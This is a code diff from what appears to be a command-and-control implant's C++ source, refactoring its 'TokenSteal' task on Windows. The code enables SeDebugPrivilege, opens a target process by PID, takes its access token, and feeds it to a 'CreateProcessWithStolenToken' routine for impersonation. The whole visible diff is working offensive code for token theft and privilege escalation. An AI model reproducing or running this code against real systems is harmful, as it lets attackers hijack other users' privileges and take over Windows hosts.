@@ -2,28 +2,6 @@
 
 namespace Task::Helper::Token
 {
-    HANDLE GetTokenByPid(Procs::PPROCS pProcs, DWORD dwPid)
-    {
-        HANDLE hToken = NULL;
-
-        HANDLE hProcess = System::Process::ProcessOpen(
-            pProcs,
-            PROCESS_QUERY_LIMITED_INFORMATION,
-            dwPid
-        );
-        if (!hProcess)
-        {
-            return NULL;
-        }
-
-        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
-        {
-            return NULL;
-        }
-
-        return hToken;
-    }
-
     BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName)
     {
         HANDLE hDuplToken = NULL;
@@ -82,32 +60,40 @@ namespace Task
         return L"Success: Reverted impersonation successfully.";
     }
 
-    // Reference:
-    // https://cocomelonc.github.io/tutorial/2022/09/25/token-theft-1.html
-    std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin)
-    {
-        HANDLE hToken = NULL;
-
+    // NTAPIs not working, so use WINAPIs
+    std::wstring TokenSteal(
+        State::PSTATE pState,
+        const std::wstring& wPid,
+        const std::wstring& wProcName,
+        bool bLogin
+    ) {
+        HANDLE hCurrToken = nullptr;
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
         // Current user needs to have SeDebugPrivilege.
-        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken))
         {
             return L"Error: Could not open the process token.";
         }
-        if (!System::Priv::PrivilegeCheck(hToken, SE_DEBUG_NAME))
+        if (!System::Priv::PrivilegeCheck(pState->pProcs, hCurrToken, SE_DEBUG_NAME))
         {
-            if (!System::Priv::PrivilegeSet(hToken, SE_DEBUG_NAME, TRUE))
+            if (!System::Priv::PrivilegeSet(pState->pProcs, hCurrToken, SE_DEBUG_NAME, TRUE))
             {
                 return L"Error: Could not set SeDebugPrivilege to current process.";
             }
         }
 
-        // Get access token of the specified process.
-        hToken = Task::Helper::Token::GetTokenByPid(pState->pProcs, dwPid);
-        if (!hToken)
+        // Open target process token handle.
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
+        if (!hProcess)
         {
-            return L"Error: Could not get token of the specified process.";
+            return L"Error: Failed to get target process handle.";
+        }
+
+        HANDLE hToken = NULL;
+        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
+        {
+            return L"Error: Failed to get target process token handle.";
         }
 
         if (bLogin)
